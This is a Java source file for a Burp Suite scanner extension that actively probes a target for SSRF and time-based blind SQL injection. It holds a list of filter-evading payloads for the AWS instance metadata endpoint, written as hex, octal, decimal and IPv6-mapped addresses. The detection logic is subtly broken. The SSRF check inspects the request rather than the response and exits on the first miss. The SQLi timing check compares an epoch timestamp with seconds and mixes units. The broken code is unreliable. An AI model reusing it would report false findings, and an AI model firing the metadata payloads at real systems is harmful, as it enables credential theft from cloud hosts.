package burp;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
/**
 *
 * @author AnoF
 */

public class CriticalIssues implements IScannerCheck {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helper;

    public CriticalIssues(IBurpExtenderCallbacks callbacks, IExtensionHelpers helper) {
        this.callbacks = callbacks;
        this.helper = helper;
    }
    
    
    
    @Override
    public List < IScanIssue > doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        ArrayList < IScanIssue > issues = new ArrayList < > ();
        

        return issues;
    }

    @Override
    public List < IScanIssue > doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        ArrayList < IScanIssue > issues = new ArrayList < > ();
        issues.addAll(AWS_SSRF(baseRequestResponse,insertionPoint));
        issues.addAll(TimeSQL(baseRequestResponse, insertionPoint));
        
        
        return issues;
    }
    
    
    
     @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {


        if (existingIssue.getIssueName().equals(newIssue.getIssueName())) {
            return -1;
            
        } else {
            return 0;
        }
    }
    
    
    
    private ArrayList < IScanIssue > AWS_SSRF(IHttpRequestResponse base_pair, IScannerInsertionPoint insertionPoint) {
        ArrayList < IScanIssue > issues = new ArrayList < > ();
        List<String> listOfPayload = new ArrayList<>(Arrays.asList(
                "http://169.254.169.254/latest/meta-data/",
                "http://[fd00:ec2::254]/latest/meta-data/",
                "http://instance-data/latest/meta-data/",
                "http://425.510.425.510/latest/meta-data/",
                "http://2852039166/latest/meta-data/",
                "http://7147006462/latest/meta-data/",
                "http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
                "http://0xA9FEA9FE/latest/meta-data/",
                "http://0x41414141A9FEA9FE/latest/meta-data/",
                "http://0251.0376.0251.0376/latest/meta-data/",
                "http://0251.00376.000251.0000376/latest/meta-data/",
                "http://0251.254.169.254/latest/meta-data/",
                "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
                "http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/",
                "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
                "http://[fd00:ec2::254]/latest/meta-data/"
        ));
        
        for (String payload : listOfPayload) {
            System.out.println(payload);
            byte[] modified_request = insertionPoint.buildRequest(helper.stringToBytes(payload));
            IHttpRequestResponse updated_request_response = callbacks.makeHttpRequest(base_pair.getHttpService(), modified_request);
            
            MatchChecker matchChecker = new MatchChecker();
            List < int[] > matches = matchChecker.getMatches(updated_request_response.getRequest(), helper.stringToBytes("hostname"), helper);
            
            if (matches.isEmpty()) {
                return issues;
            }
            List<int[]> requestHighlights = new ArrayList<>(1);
            requestHighlights.add(insertionPoint.getPayloadOffsets(helper.stringToBytes(payload)));
            
            issues.add(new RaiseVuln(
                    base_pair.getHttpService(),
                    callbacks.getHelpers().analyzeRequest(base_pair).getUrl(),
                    new IHttpRequestResponse[] {
                        base_pair,
                        callbacks.applyMarkers(updated_request_response, requestHighlights, matches)
                    },
                    "AlphaScan - AWS SSRF",
                    "The application is vulnerable to Server-Side Request Forgery (SSRF) via an AWS endpoint. The SSRF vulnerability allows an attacker to make unauthorized requests to internal or external systems. The SSRF vulnerability was detected when probing the endpoint<br><br>" + payload + "<br><br>The response from this endpoint contained sensitive information such as 'hostname'.",
                    "Certain",
                    "High"
                ));
            
        }
        
        return issues;
    
    
    }


    private ArrayList < IScanIssue> TimeSQL(IHttpRequestResponse base_pair, IScannerInsertionPoint insertionPoint) {

        ArrayList < IScanIssue > issues = new ArrayList < > ();
        double original_response_time = validateTime(base_pair);
        String fileName = "payloads/sql.txt";
        String[] fileContent = readPayloadsFromFile(fileName);
        for (String payload : fileContent) {
            
            byte[] modified_request = insertionPoint.buildRequest(helper.stringToBytes(insertionPoint.getBaseValue() + " " + payload));
            long preRequestTime = System.currentTimeMillis();
            IHttpRequestResponse request_response = callbacks.makeHttpRequest(base_pair.getHttpService(), modified_request);
            long postRequestTime = System.currentTimeMillis();
            long postRequestElapsedTime = postRequestTime - preRequestTime;
            List<int[]> requestHighlights = new ArrayList<>(1);
            requestHighlights.add(insertionPoint.getPayloadOffsets(helper.stringToBytes(insertionPoint.getBaseValue() + " " + payload)));

            if (postRequestTime > original_response_time) {
                double milliseconds = postRequestTime * 1000;

                if (milliseconds >= 5000) {
                    String modifiedPayload = payload.replace("5", "10");
                    byte[] modified_request_10_sec = insertionPoint.buildRequest(helper.stringToBytes(insertionPoint.getBaseValue() + " " + modifiedPayload));

                    long pre_request_time_10_sec = System.currentTimeMillis();
                    IHttpRequestResponse request_response_10_sec = callbacks.makeHttpRequest(base_pair.getHttpService(), modified_request_10_sec);

                    long post_request_time_10_sec = System.currentTimeMillis() - pre_request_time_10_sec; // Calculate the time difference
                    
                    List<int[]> requestHighlights_10_sec = new ArrayList<>(1);
                    requestHighlights_10_sec.add(insertionPoint.getPayloadOffsets(helper.stringToBytes(insertionPoint.getBaseValue() + " " + payload.replace("5", "10"))));
                    
                    long post_request_time_10_sec_seconds = post_request_time_10_sec / 1000; // Convert milliseconds to seconds

                    if (post_request_time_10_sec_seconds >= 10) {
                        String message = "Application is vulnerable to SQL Injection. It was observed that the application is susceptible to blind time-based SQL Injection.<br><br>"
        + "The normal application response was noted around <b>" + (int) original_response_time + "</b> seconds. <br><br>"
        + "With the Time-based payload <br><b>" + payload + "</b><br><br>"
        + "It was observed that the application response had a delay of <br><b>" + (int) (postRequestTime - preRequestTime) / 1000 + "</b> seconds. <br><br>"
        + "The revalidation was done with a 10 second delay with <b>" + payload.replace("5", "10") + "</b> and observed that the application response had a delay of <b>" + (int) (post_request_time_10_sec - pre_request_time_10_sec) / 1000 + "</b> second";


                        issues.add(new RaiseVuln(
                    base_pair.getHttpService(),
                    callbacks.getHelpers().analyzeRequest(base_pair).getUrl(),
                    new IHttpRequestResponse[] {
                        base_pair,
                        callbacks.applyMarkers(request_response, requestHighlights, null),callbacks.applyMarkers(request_response_10_sec, requestHighlights_10_sec, null)
                    },
                    "AlphaScan - Time Based SQL Injection",
                    message,
                    "Certain",
                    "High"
                ));


                    }

                }





            }




            }
        return issues;

        
    }



    private static String[] readPayloadsFromFile(String filePath) {
        try {
            // Get the project's root directory
            String projectRoot = System.getProperty("user.dir");

            // Construct the absolute file path
            Path fileToRead = Path.of(projectRoot, filePath);

            String fileContent = Files.readString(fileToRead);
            return fileContent.split("\\r?\\n"); // Split content by new line
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new String[0]; // Return an empty array if there's an issue reading the file
    }

    public double validateTime(IHttpRequestResponse base_pair) {
        long currentTime = System.currentTimeMillis();

        byte[] request = base_pair.getRequest();
        IHttpRequestResponse updated_request_response = callbacks.makeHttpRequest(base_pair.getHttpService(), request);

        long elapsedTime = System.currentTimeMillis() - currentTime;
        return (double) elapsedTime / 1000.0; // Convert milliseconds to seconds
    }




}